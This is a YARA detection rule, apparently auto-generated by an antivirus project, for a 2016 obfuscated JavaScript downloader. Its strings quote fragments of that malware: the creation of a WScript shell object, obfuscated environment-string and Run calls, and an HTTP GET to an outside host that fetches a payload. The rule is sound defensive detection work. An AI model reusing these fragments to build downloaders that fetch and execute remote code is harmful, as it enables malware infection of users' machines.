rule sig_20160428_728296666baf2cc423f4de801627d3be {
  meta:
    description = "datamaliciousorder - file 20160428_728296666baf2cc423f4de801627d3be.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e0f4d5077012cb8b543cf5f76c7e095c366f9f08f5de29c1f74f71dae6aa2e2"

  strings:
    $s1  = "function OakKpxQrqZdpRlkBixIxa() {return PkcBzeGbuBcgNyzOszZim[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "var PkcBzeGbuBcgNyzOszZim = function OdtFxbOxuVqfGjqUxgLcv() {return TerBikLcwKjyAzrJyuSoq[AngOwsClqMzdIptHnyLwp](\"WScript\"+\"" ascii
    $s3  = "DvhXuhYfrUprYxvMrdXow[YxkNiiCcwForMswOesHia](\"G\" + \"ET\", \"http://dotatest.ru/zowjsk\", false);" fullword ascii
    $s4  = "var PkcBzeGbuBcgNyzOszZim = function OdtFxbOxuVqfGjqUxgLcv() {return TerBikLcwKjyAzrJyuSoq[AngOwsClqMzdIptHnyLwp](\"WScript\"+\"" ascii
    $s5  = "var TerBikLcwKjyAzrJyuSoq = this[\"WScript\"];" fullword ascii
    $s6  = "function PksFvsAhgEwuXcgIdkCmy(OccAneUwdYkvLupNpfTbk){PkcBzeGbuBcgNyzOszZim[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s7  = "function PksFvsAhgEwuXcgIdkCmy(OccAneUwdYkvLupNpfTbk){PkcBzeGbuBcgNyzOszZim[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function OakKpxQrqZdpRlkBixIxa() {return PkcBzeGbuBcgNyzOszZim[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "return MgoQucAklVvaYayCzmCka - DdsJpoDkoTrfDiaUgcNmv;};" fullword ascii
    $s10 = "if (DvhXuhYfrUprYxvMrdXow[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function VwdJehNtjIqzAleKxeMze(){return TswAidBxrGjwVtjMxqSpu + \"\";};" fullword ascii
    $s12 = "function BefOtgUbxLbkWrcPmtOqc(MgoQucAklVvaYayCzmCka, DdsJpoDkoTrfDiaUgcNmv){IflLngEohVuaPeiRxoLmo = IflLngEohVuaPeiRxoLmo * 1; " ascii
    $s13 = "function UjoTjhAwhLjpHkwSwiTyp() {return ((VbqWlvWolTuiZcfXawUly == true) && (VbqWlvWolTuiZcfXawUly == JnhOzyJhaQvgMacTxzVno)) ?" ascii
    $s14 = "function UjoTjhAwhLjpHkwSwiTyp() {return ((VbqWlvWolTuiZcfXawUly == true) && (VbqWlvWolTuiZcfXawUly == JnhOzyJhaQvgMacTxzVno)) ?" ascii
    $s15 = "NtrEvoUwsHdtWsdLorDcr = true;" fullword ascii
    $s16 = "JnhOzyJhaQvgMacTxzVno = true; " fullword ascii
    $s17 = "var VbqWlvWolTuiZcfXawUly = false;" fullword ascii
    $s18 = "return BefOtgUbxLbkWrcPmtOqc(1 == 1 ? MktCkhCrvAnhYauTfgBln : 0, 1 == 1 ? ArbJwaYcdLhhFrpWmjKfs : 0);" fullword ascii
    $s19 = "var VywIxvXcwRyfXqcFpcFjc = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function UhsMjtCymPzkCdoKddQie(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}